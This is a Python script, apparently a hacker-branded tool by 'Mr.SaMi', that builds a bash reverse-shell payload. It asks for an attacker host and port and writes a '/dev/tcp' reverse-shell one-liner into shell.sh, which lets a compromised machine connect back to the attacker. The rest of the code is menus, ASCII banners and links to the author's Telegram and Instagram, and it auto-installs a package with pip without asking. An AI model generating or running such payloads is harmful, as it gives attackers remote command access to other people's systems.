import os
import platform
import webbrowser
import threading
import time
try:
  import pyfiglet
except:
  os.system('pip install pyfiglet')
  os.system("pip install --upgrade pyfiglet")
# Coded By Mr.SaMI
red = "\033[1;31m"
green = "\033[1;32m"
cyan = "\033[1;36m"


def __shell__(host,port):
  _shell_ = f"""
sh -i >& /dev/tcp/{host}/{port} 0>&1
"""
  with open('shell.sh','w') as sh:
    sh.write(_shell_)
    sh.close()
    time.sleep(5)
    path = os.getcwd()
    print(f"{red}[+]{cyan} The shell is saved in the following path:{green} {path}\shell.sh" )

def __banner__():
  sami = pyfiglet.Figlet(font="slant")
  banner = sami.renderText("Shell Bash")
  print(green+banner)


def __ye__():
 clear()
 __banner__()
 host = input("\033[31m╔═══[\033[32mEnter [IP\HOST]\033[31m]\n\033[31m╚══》 \033[32m‍")
 port = input("\033[31m╔═══[\033[32mEnter [PORT]\033[31m]\n\033[31m╚══》 \033[32m‍")
 threading.Thread(target=__shell__,args=(host,port)).start()


def sami_logo():
    sami = pyfiglet.Figlet(font="slant")
    banner = sami.renderText("Mr.SaMi")
    print(f"""{red}{banner}{green}""")

def __sami__():
    clear()
    sami_logo()
    print(f"""
{red}[+]{green} This tool creates a shell to connect back to the servers‍
‍
{cyan}[#]{green} Follow me :‍
[1] Telegram Channel
[2] Instagram
[3] Call Me
[4] Back Home
[0] Exit
""")
    dev_ = input("\033[31m╔═══[\033[32mChoose A Number‍\033[31m]\n\033[31m╚══》 \033[32m‍")
    if dev_ =="1":
        webbrowser.open("https://t.me/TYG_TEAM")
        sami()
    elif dev_ =="2":
        webbrowser.open("https://instagram.com/cyber_77k")
        sami()
    elif dev_ =="3":
        webbrowser.open("https://t.me/TYG_YE_BOT")
        sami()
    elif dev_ =="4":
        main()
    elif dev_=="0":
        os.system("exit")
    else:
        main()



def clear():
  if platform.system() == "Windows":
    os.system("cls")
  else:
    os.system("clear")

def banner():
  sami = pyfiglet.Figlet(font="slant")
  banner = sami.renderText("Shell Bash")
  print(f"""{green}
               Coded By Mr.SaMi : @TYG_YE
                   Version : V 1.0
""")
  print(f"""{red}{banner}{green}
{red}[1]{green} Created  Bash shell
{red}[2]{green} About
{red}[0]{green} Exit
  """)


def main():
  clear()
  banner()
  __choose__ =input("\033[31m╔═══[\033[32mChoose\033[31m]\n\033[31m╚══》")
  if __choose__ =="1":
   __ye__()
  elif __choose__=="2":
   __sami__()
  elif __choose__ =="0":
   os.system("exit")
  else:
   main()
   


if __name__ =="__main__":
  main()
